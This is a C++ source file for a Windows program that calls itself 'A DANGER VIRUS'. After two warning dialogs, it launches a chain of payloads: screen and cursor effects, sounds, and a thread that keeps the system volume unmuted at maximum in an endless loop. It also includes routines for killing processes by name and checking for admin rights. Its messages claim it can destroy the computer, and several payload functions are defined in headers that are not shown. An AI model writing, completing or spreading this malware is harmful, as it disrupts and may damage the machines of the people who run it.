#include"TV.h"
#include"P.h"
#include"d.h"
int vol = 100;

bool SetVolume(int level) {
	HRESULT hr;
	IMMDeviceEnumerator* pDeviceEnumerator = 0;
	IMMDevice* pDevice = 0;
	IAudioEndpointVolume* pAudioEndpointVolume = 0;
	IAudioClient* pAudioClient = 0;

	try {
		hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pDeviceEnumerator);
		if (FAILED(hr)) throw "CoCreateInstance";
		hr = pDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
		if (FAILED(hr)) throw "GetDefaultAudioEndpoint";
		hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudioEndpointVolume);
		if (FAILED(hr)) throw "pDevice->Active";
		hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
		if (FAILED(hr)) throw "pDevice->Active";

		if (level == -2) {
			hr = pAudioEndpointVolume->SetMute(FALSE, NULL);
			if (FAILED(hr)) throw "SetMute";
		}
		else if (level == -1) {
			hr = pAudioEndpointVolume->SetMute(TRUE, NULL);
			if (FAILED(hr)) throw "SetMute";
		}
		else {
			if (level < 0 || level > 100) {
				hr = E_INVALIDARG;
				throw "Invalid Arg";
			}

			float fVolume;
			fVolume = level / 100.0f;
			hr = pAudioEndpointVolume->SetMasterVolumeLevelScalar(fVolume, &GUID_NULL);
			if (FAILED(hr)) throw "SetMasterVolumeLevelScalar";

			pAudioClient->Release();
			pAudioEndpointVolume->Release();
			pDevice->Release();
			pDeviceEnumerator->Release();
			return true;
		}
	}
	catch (...) {
		if (pAudioClient) pAudioClient->Release();
		if (pAudioEndpointVolume) pAudioEndpointVolume->Release();
		if (pDevice) pDevice->Release();
		if (pDeviceEnumerator) pDeviceEnumerator->Release();
	}
	return false;
}

void VolumeThread() {
	while (true) {
		SetVolume(-2);
		SetVolume(vol);
	}
}

bool IsProcessRunning(LPCWSTR name) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(procEntry);

	BOOL hasNext = Process32First(snapshot, &procEntry);

	while (hasNext) {
		if (lstrcmpi(procEntry.szExeFile, name) == 0) {
			return true;
		}

		hasNext = Process32Next(snapshot, &procEntry);
	}

	return false;
}

int GetPIDFromProcessName(LPCWSTR name) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(procEntry);

	BOOL hasNext = Process32First(snapshot, &procEntry);

	while (hasNext) {
		if (lstrcmpi(procEntry.szExeFile, name) == 0) {
			return procEntry.th32ProcessID;
		}

		hasNext = Process32Next(snapshot, &procEntry);
	}

	return -1;
}

BOOL KillProcessByID(DWORD pid) {
	HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	return TerminateProcess(proc, 0);
}

BOOL KillProcessByName(LPCWSTR name) {
	int pid = GetPIDFromProcessName(name);

	if (pid == -1)
		return FALSE;

	return KillProcessByID(pid);
}
void InitDPI() {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");

	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}

	FreeLibrary(hModUser32);
}


BOOL IsAdminProcess(UINT PID)
{
	if (PID <= 0)
		PID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
	if (hProcess == NULL) {//要么没这个进程，要么也有可能是ADMIN权限无法打开
		return TRUE;
	}
	HANDLE hToken;
	DWORD dwAttributes;
	DWORD isAdmin(0);
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		SID_IDENTIFIER_AUTHORITY Authority;
		Authority.Value[5] = 5;

		PSID psidAdmin = NULL;
		if (AllocateAndInitializeSid(&Authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &psidAdmin))
		{
			DWORD dwCount = 0;
			GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwCount);
			TOKEN_GROUPS *pTokenGroups = (TOKEN_GROUPS *)new BYTE[dwCount];
			GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwCount, &dwCount);
			DWORD dwGroupCount = pTokenGroups->GroupCount;
			for (DWORD i = 0; i < dwGroupCount; i++)
			{
				if (EqualSid(psidAdmin, pTokenGroups->Groups[i].Sid))
				{
					dwAttributes = pTokenGroups->Groups[i].Attributes;
					isAdmin = (dwAttributes & SE_GROUP_USE_FOR_DENY_ONLY) != SE_GROUP_USE_FOR_DENY_ONLY;
					break;
				}
			}
			delete[] pTokenGroups;
			FreeSid(psidAdmin);
		}
		CloseHandle(hToken);
	}
	CloseHandle(hProcess);
	return isAdmin;
}


int main() {
	InitDPI();
		if (MessageBox(NULL, L"You open's executable is a malware\nit can crash and destroy your computer using.\nI wana you know the malware.\nYou want to exit and safe your coamputer and system,press cannel button!\nYou in the safe system and test,press OK button and run it!\nI wana you know malware is a not good executable!", L"A DANGER VIRUS", MB_YESNO | MB_ICONEXCLAMATION) == IDYES)
		{
			Sleep(10);
			if (MessageBox(NULL, L"THIS IS LAST MESSAGE FOR THE MALWARE!\nPRESS CANNEL AND TO EXIT!\nWANA COMPUTER DESTROY PRESS YES!", L"A DANGER VIRUS", MB_YESNO | MB_ICONEXCLAMATION) == IDYES)
			{
				P();
				D();
				CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
				Sleep(5000);
				rt(_MSG);
				Sleep(2000);
				rt(FlyCur);
				CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(VolumeThread), NULL, 0, NULL);
				rt(Sound);
				CopyCur();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Left();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Tunnel();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Down();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				ExecutePayload(big, PAYLOAD_TIME);
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				G();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				ExecutePayload(Payload1, PAYLOAD_TIME);
				ExecutePayload(Payload2, PAYLOAD_TIME);
				ExecutePayload(Payload3, PAYLOAD_TIME);
				ExecutePayload(Payload4, PAYLOAD_TIME);
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				ExecuteShader(Payload5, PAYLOAD_TIME);
				Payload6();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Payload7();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Payload7();
				Payload6();
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				Payload9();
				ExitProcess(0);
				Sleep(INFINITE);
			}
			else
			{
				ExitProcess(0);
			}
		}
		else
		{
			ExitProcess(0);
		}
}